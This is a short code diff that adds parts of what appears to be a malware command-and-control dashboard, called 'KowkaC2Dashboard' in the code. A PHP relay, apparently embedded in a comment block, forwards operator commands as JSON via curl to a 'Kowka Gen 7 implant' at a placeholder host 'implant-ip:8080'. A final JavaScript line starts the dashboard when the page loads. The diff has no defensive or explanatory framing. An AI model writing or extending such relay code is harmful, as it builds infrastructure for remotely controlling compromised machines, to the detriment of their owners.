@@ -321,4 +321,26 @@ header('Access-Control-Allow-Headers: Content-Type');
 
 $input = json_decode(file_get_contents('php://input'), true);
 
-// Forward command to actual Kowka Gen 
+// Forward command to actual Kowka Gen 7 implant
+$implant_url = 'http://implant-ip:8080/command';
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $implant_url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($input));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Content-Type: application/json',
+]);
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+echo $response;
+?>
+*/
+
+// Initialize dashboard when page loads
+document.addEventListener('DOMContentLoaded', () => {
+    new KowkaC2Dashboard();
+});
